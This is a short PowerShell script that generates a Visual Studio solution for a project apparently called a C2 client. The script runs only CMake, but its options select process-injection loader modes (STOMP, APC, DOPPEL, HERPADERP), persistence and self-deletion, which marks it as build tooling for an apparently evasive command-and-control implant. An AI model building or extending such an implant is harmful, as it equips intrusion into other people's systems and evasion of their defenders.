# Generate a Visual Studio 2022 solution/project from CMake.
# This is the most reliable way to get a .sln + .vcxproj that matches CMakeLists.txt.
# Run from the repo root: .\client\generate_vs_project.ps1
# Optional: pass a loader mode, e.g. -Loader APC
param(
    [ValidateSet("NONE", "STOMP", "APC", "DOPPEL", "HERPADERP")]
    [string]$Loader = "NONE",
    [switch]$Persist,
    [switch]$SelfDel
)

$cmake = Get-Command cmake -ErrorAction SilentlyContinue
if (-not $cmake) {
    Write-Host "ERROR: cmake is not in PATH. Install Visual Studio 2022 with the C++ and CMake workloads." -ForegroundColor Red
    exit 1
}

$args = @(
    "-S", "$PSScriptRoot"
    "-B", "$PSScriptRoot\build"
    "-G", "Visual Studio 17 2022"
    "-A", "x64"
    "-DC2_LOADER=$Loader"
)
if ($Persist) { $args += "-DC2_PERSIST=ON" }
if ($SelfDel) { $args += "-DC2_SELF_DEL=ON" }

Write-Host "cmake $($args -join ' ')"
& cmake @args
if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: CMake generation failed." -ForegroundColor Red
    exit 1
}

Write-Host "`nSolution ready: $PSScriptRoot\build\c2_client.sln"
Write-Host "Open it in Visual Studio, select x64/Release, and build."
